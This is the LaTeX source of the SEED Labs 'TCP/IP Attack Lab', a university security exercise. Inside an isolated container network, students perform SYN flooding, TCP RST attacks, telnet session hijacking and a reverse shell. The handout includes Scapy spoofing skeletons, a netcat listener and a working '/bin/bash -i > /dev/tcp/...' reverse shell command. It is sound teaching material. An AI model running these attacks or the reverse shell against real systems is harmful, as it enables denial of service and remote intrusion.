%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\newcommand{\commonfolder}{../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website.}






\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\telnet} {\texttt{telnet}\xspace}
\newcommand{\tcpFigs}{./Figs}

\lhead{\bfseries SEED Labs -- TCP/IP Attack Lab}

\begin{document}

\newcounter{task}
\setcounter{task}{1}
\newcommand{\mytask} {\bf {\noindent \arabic{task}} \addtocounter{task}{1} \,}



\begin{center}
{\LARGE TCP/IP Attack Lab}
\end{center}

\seedlabcopyright{2018 - 2020}



% *******************************************
% SECTION
% ******************************************* 
\section{Overview}


The learning objective of this lab is for students to gain first-hand
experience on vulnerabilities, as well as on attacks against these
vulnerabilities. Wise people learn from mistakes. In security education, we
study mistakes that lead to software vulnerabilities. Studying mistakes
from the past not only help students understand why systems are vulnerable,
why a seemly-benign mistake can turn into a disaster, and why many
security mechanisms are needed. More importantly, it also helps students
learn the common patterns of vulnerabilities, so they can avoid making
similar mistakes in the future. Moreover, using vulnerabilities as case
studies, students can learn the principles of secure design, secure
programming, and security testing.

The vulnerabilities in the TCP/IP protocols represent a special genre of
vulnerabilities in protocol designs and implementations; they provide an
invaluable lesson as to why security should be designed in from the
beginning, rather than being added as an afterthought. Moreover, studying
these vulnerabilities help students understand the challenges of network
security and why many network security measures are needed.
In this lab, students will conduct several attacks on TCP.
This lab covers the following topics:

\begin{itemize}[noitemsep]
\item The TCP protocol
\item TCP SYN flood attack, and SYN cookies 
\item TCP reset attack
\item TCP session hijacking attack
\item Reverse shell 
\item A special type of TCP attack, the Mitnick attack, is covered 
in a separate lab. 
\end{itemize}


\paragraph{Readings and videos.}
Detailed coverage of the TCP attacks can be found in the following:

\begin{itemize}
\item Chapter 16 of the SEED Book, \seedbook
\item Section 6 of the SEED Lecture, \seedisvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironmentB



% *******************************************
% SECTION
% ******************************************* 
\section{Lab Environment}


In this lab, students need to have at least 3 machines. One machine 
is mainly used for launching attacks, the second machine is used as the victim, and 
the third one is used as the observer and user. Students can use three virtual 
machines for this lab, but it will be much more convenient to 
use one VM plus three containers. We will launch 
attacks from the VM against one of the containers, while using
the other two containers as the observer/user machines.
The lab environment is depicted in the following:


\begin{lstlisting}[backgroundcolor=]
  +------------+      +------------+  +------------+  +------------+
  |     VM     |      |  Container |  |  Container |  |  Container |
  | (attacker) |      |  (victim)  |  |   (user1)  |  |   (user2)  |
  |  10.9.0.1  |      |  10.9.0.5  |  |  10.9.0.6  |  |  10.9.0.7  |
  +----+-------+      +------+-----+  +------+-----+  +------+-----+
       | br-<id>             | eth0          | eth0          | eth0
       |                     |               |               |
-------+---------------------+---------------+---------------+-------
           Network  10.9.0.0/24

\end{lstlisting}
 

%The configuration is described in Figure~\ref{tcp:fig:env}.

%\begin{figure}[htb]
%  \begin{center}
%    \includegraphics[width=0.6\textwidth]{\tcpFigs/TCP_Env_setup.pdf}
%  \end{center}
%  \caption{Environment Setup}
%  \label{tcp:fig:env}
%\end{figure}
 

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% Input common files related to containers


\paragraph{Container setup and commands.}
Please download the
\texttt{Labsetup.zip} file to your VM from the lab's website,
unzip it, enter the \texttt{Labsetup} folder, and 
use the \texttt{docker-compose.yml} file to 
set up the lab environment. Detailed explanation
of the content in this file and all the involved 
\texttt{Dockerfile} can be found from the 
user manual, which can be downloaded from the website. 
If this is the first time you set up a SEED lab environment
using Docker and Compose, it is very important that you read 
the user manual. 

In the following, we list some of the commonly
used commands related to Docker and Compose. 
Since we are going to use 
these commands and several docker commands very
frequently, we have created aliases for these commands
in the \texttt{.bashrc} file.  


\begin{lstlisting}
$ docker-compose build  # Build the container image
$ docker-compose up     # Start the container
$ docker-compose down   # Shut down the container

// Aliases for commonly used docker and Compose commands. 
$ dcbuild       # Alias for: docker-compose build
$ dcup          # Alias for: docker-compose up
$ dcdown        # Alias for: docker-compose down
$ dockps        # Alias for: docker ps --format "{{.ID}}  {{.Names}}" 
$ docksh <id>   # Alias for: docker exec -it <id> /bin/bash
\end{lstlisting}


If you encounter problems when setting up the lab environment, 
please read the ``Common Problems'' section of the manual
for potential solutions.


\input{\commonfolder/container_interface}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%





% *******************************************
% SECTION
% ******************************************* 
\section{Lab Tasks}


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection {Task 1: SYN Flooding Attack}


\begin{figure}[htb]
  \begin{center}
    \includegraphics[width=0.9\textwidth]{\tcpFigs/TCP_SYN_Flooding.pdf}
  \end{center}
  \caption{SYN Flooding Attack}
  \label{tcp:fig:synflooding}
\end{figure}
 


SYN flood is a form of DoS attack in which attackers send many SYN
requests to a victim's TCP port, but the attackers have no intention 
to finish the 3-way handshake procedure. Attackers either use spoofed 
IP address or do not continue the procedure. 
Through this attack, attackers can flood the victim's queue that is 
used for half-opened connections, i.e. the connections that has finished SYN, SYN-ACK, 
but has not yet gotten a final ACK back. When this queue is full, 
the victim cannot take any more connection. Figure~\ref{tcp:fig:synflooding}
illustrates the attack.

The size of the queue has a system-wide setting.  In Ubuntu OSes, we can check the
setting using the following command: 

\begin{lstlisting}
$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
\end{lstlisting}

We can use command \texttt{"netstat -nat"} to check the usage of the queue, 
i.e., the number of half-opened connection associated with a listening port. 
The state for such connections is \texttt {SYN-RECV}. If the 3-way handshake
is finished, the state of the connections will be {\tt ESTABLISHED}.


\paragraph{SYN Cookie Countermeasure:}
By default, Ubuntu's SYN flooding countermeasure is turned on. This 
mechanism is called SYN cookie. It will kick in if the machine
detects that it is under the SYN flooding attack.
We can use the {\tt sysctl} command to turn on/off the SYN 
cookie mechanism:

\begin{lstlisting}
$ sudo sysctl -a | grep syncookies     (Display the SYN cookie flag) 
$ sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
$ sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
\end{lstlisting}



\paragraph{Launching the attack.}
We provide a C program called \texttt{synflood.c}. Students can compile
the program and then launch the attack on the target machine:

\begin{lstlisting}
$ gcc -o synflood synflood.c
$ sudo ./synflood 10.9.0.5 23
\end{lstlisting}
 

While the attack is going on, 
run the \texttt{"netstat -nat"} command on the victim machine, and compare 
the result with that before the attack. 
Please go to another machine, try to telnet to the target machine, 
and describe your observation.


\paragraph{An interesting observation.} On Ubuntu 20.04, if machine X
has never made a telnet to the victim machine, when the SYN flooding 
attack is launched, machine X will not be able to telnet into the 
victim machine. However, if before the attack, machine X
has already made a telnet to the victim machine, then X 
seems to be ``immune'' to the SYN flooding attack, and can
successfully telnet to the victim machine during the attack. 
It seems that the victim machine remembers past successful 
connections, and uses this memory when establishing
future connections with the ``returning'' client. 
This behavior does not exist in Ubuntu 16.04 
and earlier versions. 

We have not figured out whether this is a countermeasure specifically designed
for the SYN flooding attack or this is just a side effect caused by
the optimization in the TCP implementation. During the attack, 
to clean the victim machine's memory, 
we can simply reboot the target machine.
For containers, rebooting is very simple, we 
just restart it using the following docker command:

\begin{lstlisting}
$ docker restart <container id>
\end{lstlisting}
 



\paragraph{Enable the SYN Cookie Countermeasure.}
Please enable the SYN cookie mechanism, and 
run your attacks again, and compare the results. 



\paragraph{Note on Scapy:} Although theoretically, we can use Scapy for this task, we have
observed that the number of packets sent out by Scapy per second is much smaller than that by
\texttt{Netwox}. This low rate makes it difficult for the attack to be successful.   We were
not able to succeed in SYN flooding attacks using Scapy.



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection {Task 2: TCP RST Attacks on \texttt{telnet} and 
             \texttt{ssh} Connections}

The TCP RST Attack can terminate an established TCP connection between
two victims. For example, if there is an established \telnet connection (TCP)
between two users A and B, attackers can spoof a RST packet from A to B,
breaking this existing connection. To succeed in this attack, attackers
need to correctly construct the TCP RST packet. 

In this task, you need to launch an TCP RST attack to break an existing 
\telnet connection between A and B. After that,
try the same attack on an {\tt ssh} connection. Please describe
your observations.  To simplify the lab,
we assume that the attacker and the victim are on the same LAN,
i.e., the attacker can observe the TCP traffic between
A and B.


\paragraph{Launching the attack manually.} 
Please use Scapy to conduct the TCP RST attack. 
A skeleton code is provided in the following. You need to replace each
\texttt{@@@@} with an actual value (you can get them using Wireshark):  


\begin{lstlisting}
#!/usr/bin/python
from scapy.all import *

ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
\end{lstlisting}

\paragraph{Optional: Launching the attack automatically.} 
Students are encouraged to write a program to launch the 
attack automatically using the sniffing-and-spoofing technique. 
Unlike the manual approach, we get all the parameters
from sniffed packets, so the entire attack is automated.  
Please make sure that when you 
use Scapy's \texttt{sniff} function, don't forget to 
set the \texttt{iface} argument.  

 

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{comment}
% We comment out  this task, because it does not work any more.
% It seems that the video streaming client will reconnect to the server
% if the connection is broken. We haven't figured out a solution yet.
%
% My fugure plan:
%    I would like to use container to host our own streeming service.
%    Then we can launch the RST attack on the server. 
%    

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection {Task 3: TCP RST Attacks on Video Streaming Applications}

Let us make the TCP RST attack more interesting by experimenting it on 
the applications that are widely used in nowadays.
We choose the video streaming application in 
this task. For this task, you can choose a video streaming web site that you 
are familiar with (we will not name any specific web site here).  Most of
video sharing websites establish a TCP connection with the client for 
streaming the video content. The attacker's goal is to disrupt the TCP session 
established between the victim and video streaming machine. To 
simplify the lab, we assume that the attacker and the victim are on the 
same LAN. In the following, we describe the common interaction between
a user (the victim) and some video-streaming web site:

\begin{itemize}
\item The victim browses for a video content in the video-streaming web 
site, and selects one of the videos for streaming. 

\item Normally video contents are hosted by a different machine,
where all the video contents are located. After the victim selects 
a video, a TCP session will be established between the victim 
machine and the content server for the video streaming.
The victim can then view the video he/she has selected.
\end{itemize}

Your task is to disrupt the video streaming by breaking the 
TCP connection between the victim and the content server.
You can let the victim user browse the video-streaming 
site from another (virtual) machine or from the same (virtual) machine
as the attacker. Please be noted that, to avoid liability issues,
any attacking packets should be targeted 
at the victim machine (which is the machine run by yourself), 
not at the content server machine (which does not belong to you).
You only need to use \texttt{Netwox} for this task.  

\end{comment}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

            

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 4: TCP Session Hijacking}



\begin{figure}[htb]
  \begin{center}
    \includegraphics[width=0.8\textwidth]{\tcpFigs/TCP_Session_Hijacking.pdf}
  \end{center}
  \caption{TCP Session Hijacking Attack}
  \label{tcp:fig:hijacking}
\end{figure}
 
   
The objective of the TCP Session Hijacking attack is to hijack an 
existing TCP connection (session) between two victims by injecting malicious contents
into this session. If this connection is a \telnet session, attackers
can inject malicious commands (e.g. deleting an important file) 
into this session, causing the victims 
to execute the malicious commands. 
Figure~\ref{tcp:fig:hijacking} depicts how the attack works.
In this task, you need to demonstrate how you can hijack a 
\texttt{telnet} session between two computers. Your goal is to get the
\texttt{telnet} server to run a malicious command from you.
For the simplicity of the task, we assume that 
the attacker and the victim are on the same LAN.


\paragraph{Launching the attack manually.}
Please use Scapy to conduct the TCP Session Hijacking attack.
A skeleton code is provided in the following. You need to replace each
\texttt{@@@@} with an actual value; you can use Wireshark to figure out what value you 
should put into each field of the spoofed TCP packets. 


\begin{lstlisting}
#!/usr/bin/python
from scapy.all import *

ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="@@@@", seq=@@@@, ack=@@@@)
data = "@@@@"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
\end{lstlisting}


\paragraph{Optional: Launching the attack automatically.}
Students are encouraged to write a program to launch the
attack automatically using the sniffing-and-spoofing technique.
Unlike the manual approach, we get all the parameters
from sniffed packets, so the entire attack is automated.
Please make sure that when you
use Scapy's \texttt{sniff} function, don't forget to
set the \texttt{iface} argument.




% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 5: Creating Reverse Shell using TCP Session Hijacking}

When attackers are able to inject a command to the victim's machine using
TCP session hijacking, they are not interested in running one simple
command on the victim machine; they are interested in running many
commands. Obviously, running these commands all through TCP session
hijacking is inconvenient. What attackers want to achieve is to use the
attack to set up a back door, so they can use this
back door to conveniently conduct further damages.

A typical way to set up back doors is to run a reverse shell from the
victim machine to give the attack the shell access to the victim machine.
Reverse shell is a shell process running on a remote machine, connecting
back to the attacker's machine. This gives an attacker a convenient way to
access a remote machine once it has been compromised. 


In the following, we will show how we can set up a reverse shell if we can
directly run a command on the victim machine (i.e. the server machine). 
In the TCP session hijacking attack, attackers cannot directly run a
command on the victim machine, so their jobs is to run a reverse-shell
command through the session hijacking attack. 
In this task, students need to demonstrate that they can achieve this goal.


To have a \texttt{bash} shell on a remote machine connect back to the attacker's machine, the
attacker needs a process waiting for some connection on a given port. In this example, we will
use \texttt{netcat}. This program allows us to specify a port
number and can listen for a connection on that port.
In the following demo, we show two windows, each one is from a 
different machine. The top window is the attack machine \texttt{10.9.0.1},  
which runs \texttt{netcat}~(\texttt{nc} for short), listening on port \texttt{9090}. 
The bottom window is the victim machine \texttt{10.9.0.5}, and 
we type the reverse shell command.
As soon as the reverse shell gets executed, the top window indicates 
that we get a shell. This is a reverse shell, i.e., it runs on \texttt{10.9.0.5}.  


\begin{lstlisting}[backgroundcolor=]
           +---------------------------------------------------+ 
           | (*@\textbf{On 10.9.0.1 (attcker)}@*)                             |
           |                                                   | 
           | $ nc -lnv 9090                                    |  
           | Listening on 0.0.0.0 9090                         |  
           | Connection received on 10.9.0.5 49382             |  
           | $   <--+ (*@\textbf{This shell runs on 10.9.0.5}@*)              | 
           |                                                   |  
           +---------------------------------------------------+  
          
           +---------------------------------------------------+  
           | (*@\textbf{On 10.9.0.5 (victim)}@*)                              |
           |                                                   | 
           |$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1  | 
           |                                                   | 
           +---------------------------------------------------+
\end{lstlisting}

We provide a brief description on the reverse shell command in the following.
Detailed explanation can be found in the SEED book.

\begin{itemize}
\item \texttt{"/bin/bash -i"}: \texttt{i} stands for interactive, meaning that the shell must be
  interactive (must provide a shell prompt)

\item \texttt{"> /dev/tcp/10.9.0.1/9090"}: This causes the output (\texttt{stdout}) of the shell
  to be redirected to the tcp connection to \texttt{10.9.0.1}'s port \texttt{9090}.
  The output \texttt{stdout} is represented by file descriptor number~1.

\item \texttt{"0<\&1"}: File descriptor 0 represents the standard input (\texttt{stdin}). This causes
  the  \texttt{stdin} for the shell to be obtained from the tcp connection.

\item \texttt{"2>\&1"}: File descriptor 2 represents standard error \texttt{stderr}. This
  causes the error output to be redirected to the tcp connection.
\end{itemize}

In summary, \texttt{"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<\&1 2>\&1"} starts a
\texttt{bash} shell, with its input coming from a tcp connection, and its standard
and error outputs being
redirected to the same tcp connection. 

In the demo shown above, when the \texttt{bash}
shell command is executed on \texttt{10.9.0.5}, it connects back to the \texttt{netcat} process
started on \texttt{10.9.0.1}. This is confirmed via the \texttt{"Connection received on 10.9.0.5"}
message displayed by \texttt{netcat}.


The description above shows how you can set up a reverse shell if you have
the access to the target machine, which is the \texttt{telnet} server in
our setup, but in this task, you do not have such an access. Your task is 
to launch an TCP session hijacking attack on an existing \texttt{telnet}
session between a user and the target server. You need to inject your
malicious command into the hijacked session, so you can get a reverse
shell on the target server. You can use either Netwox or Scapy for this task (using Scapy is
more convenient).




% *******************************************
% SECTION
% ******************************************* 
\section{Lab Report}

\seedsubmission


\end{document}
